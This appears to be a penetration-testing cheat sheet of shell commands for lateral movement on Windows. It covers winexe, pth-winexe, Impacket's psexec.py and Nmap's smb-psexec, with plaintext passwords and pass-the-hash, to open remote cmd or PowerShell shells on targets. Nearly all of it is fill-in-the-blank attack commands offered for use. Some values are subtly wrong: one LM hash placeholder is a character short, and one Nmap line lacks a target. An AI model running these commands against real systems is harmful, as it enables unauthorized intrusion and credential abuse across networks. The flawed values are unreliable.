# Unix Shell

Search Tag(s): #lateral-movement #psexec #impacket #windows

## Samba Suite Utils

`$ winexe -U <domain>/<username>%<password> //<IP> <cmd.exe | powershell.exe>`

- Pass the Hash

`$ pth-winexe -U <domain>/<username>%aad3b435b51404eeaad3b435b51404ee:<nt_hash> //<IP> <cmd.exe | powershell.exe>`

## Impacket

`$ psexec.py <username>:<password>@<IP> [-codecs <codec>]`

- Pass the Hash

```
$ psexec.py <username>@<IP> -hashes <LM>:<NT> [-codecs <codec>]

$ psexec.py <domain_name>/<username>@<IP> -hashes 0000000000000000000000000000000:<NT>

$ psexec.py <domain_name>/<username>@<IP> -hashes aad3b435b51404eeaa3b435b51404ee:<NT>

$ psexec.py <domain_name>/<username>@<IP> -hashes :<NT>
```

## Nmap

```
$ nmap -p 445 -Pn --script smb-psexec --script-args 'smbuser=<username>,smbhash=<nt_hash>' <IP>/<CIDR>

$ sudo nmap -p U:137,T:139 -Pn -sUS --script smb-psexec --script-args 'smbuser=<username>,smbhash=<nt_hash>'
```